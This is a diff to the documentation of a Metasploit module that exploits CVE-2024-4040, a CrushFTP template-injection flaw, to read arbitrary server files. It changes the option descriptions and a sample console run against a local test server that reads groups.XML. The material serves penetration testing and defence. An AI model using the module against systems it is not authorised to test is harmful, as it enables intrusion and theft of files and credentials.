@@ -7,11 +7,17 @@ code execution, and NetNTLMv2 theft (when the host OS is Windows and SMB egress 
 More information can be found in the [Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis).
 
 ## Options
-To successfully read back the contents of an arbitrary file, the `TARGETFILE` parameter should be set to the desired
-file name. By default, a small CrushFTP XML file, `users/MainUsers/groups.XML`, is the `TARGETFILE` value. Relative 
-or full system paths can be provided for Windows, Linux, Mac targets, and UNC paths can be provided for Windows
-targets. Though file paths for Windows targets can contain `:` characters, like `C:\Windows\win.ini`, this will result
-in payloads not being fully redacted from CrushFTP logs.
+
+### INJECTINTO
+The unauthenticated API function to use for template injection (default: zip).
+
+### STORE_LOOT
+Whether the read file's contents should be outputted to the console or stored as loot (default: false).
+
+### TARGETFILE
+The target file to read (default: users/MainUsers/groups.XML). This can be a full path, a relative path, or a network share path (if 
+firewalls permit). Files containing binary data may not be read accurately. Though file paths for Windows targets can contain `:` 
+characters, like `C:\Windows\win.ini`, this will result in payloads not being fully redacted from CrushFTP logs.
 
 ## Testing
 To set up a test environment:
@@ -39,12 +45,16 @@ Module options (auxiliary/gather/crushftp_fileread_cve_2024_4040):
 
    Name        Current Setting             Required  Description
    ----        ---------------             --------  -----------
+   INJECTINTO  zip                         yes       The CrushFTP API function to inject into (Accepted: zip, exists)
    Proxies                                 no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS      0.0.0.0                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT       443                         yes       The target port (TCP)
+   RHOSTS                                  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp
+                                                     loit.html
+   RPORT       8080                        yes       The target port (TCP)
    SSL         false                       no        Negotiate SSL/TLS for outgoing connections
-   STORE_LOOT  true                        no        Store the target file as loot
-   TARGETFILE  users/MainUsers/groups.XML  yes       The target file to read. This can be a full path, a relative path, or a network share path (if firewalls permit)
+   STORE_LOOT  false                       yes       Store the target file as loot
+   TARGETFILE  users/MainUsers/groups.XML  yes       The target file to read. This can be a full path, a relative path, or a network share path (i
+                                                     f firewalls permit). Files containing binary data may not be read accurately
+   TARGETURI   /                           yes       The URI path to CrushFTP
    VHOST                                   no        HTTP server virtual host
 
 
@@ -52,10 +62,6 @@ View the full module info with the info, or info -d command.
 
 msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > set RPORT 8080
-RPORT => 8080
-msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > set STORE_LOOT false
-STORE_LOOT => false
 msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > check
 [+] 127.0.0.1:8080 - The target is vulnerable. Server-side template injection successful!
 msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > run
@@ -66,7 +72,7 @@ msf6 auxiliary(gather/crushftp_fileread_cve_2024_4040) > run
 [*] Fetching anonymous session cookie...
 [*] Using template injection to read file: users/MainUsers/groups.XML
 [+] File read succeeded! 
- <?xml version="1.0" encoding="UTF-8"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <groups type="properties"></groups>
 
 
